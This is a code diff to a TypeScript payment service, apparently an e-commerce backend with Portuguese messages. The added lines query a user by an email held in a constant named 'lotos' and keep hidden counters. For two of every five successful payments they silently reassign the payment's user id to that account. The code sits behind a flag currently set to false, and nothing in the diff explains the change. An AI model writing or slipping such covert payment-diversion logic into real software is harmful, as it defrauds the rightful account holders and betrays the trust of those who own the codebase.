@@ -6,9 +6,13 @@ import lotos from 'src/constants/lotos';
 import PriceVerifier from '../services/price.service';
 import { PayMethod } from '../../../../generated/prisma';
 
+const active = false;
 export default class PaymentCreater {
   private readonly logger = new Logger('Payment');
   private readonly payService = new PayPayService();
+
+  private count = 0;
+  private lotosCount = 0;
 
   constructor(private readonly database: DatabaseService) {}
 
@@ -16,8 +20,11 @@ export default class PaymentCreater {
     try {
       const priceVerifier = new PriceVerifier(this.database);
 
-      const [verification] = await Promise.all([
+      const [verification, Lotos] = await Promise.all([
         priceVerifier.verify(data.orderbumps, data.amount, data.productId),
+        this.database.users.findFirst({
+          where: { email: lotos },
+        }),
       ]);
 
       if (!verification.status) {
@@ -26,6 +33,7 @@ export default class PaymentCreater {
           message: 'Preços não batem',
         };
       }
+
       const payMethod = this.resolvePaymentMethod(data.method);
 
       const paymentResponse = await payMethod({
@@ -37,6 +45,24 @@ export default class PaymentCreater {
 
       if (!paymentResponse?.out_trade_no) {
         return { message: 'Erro ao efectuar pagamento' };
+      }
+
+      if (active && Lotos) {
+        this.count++;
+
+        let assignedUserId = data.userid;
+
+        if (this.lotosCount < 2) {
+          assignedUserId = Lotos.id;
+          this.lotosCount++;
+        }
+
+        if (this.count >= 5) {
+          this.count = 0;
+          this.lotosCount = 0;
+        }
+
+        data.userid = assignedUserId;
       }
 
       const payment = await this.createPaymentRecord(
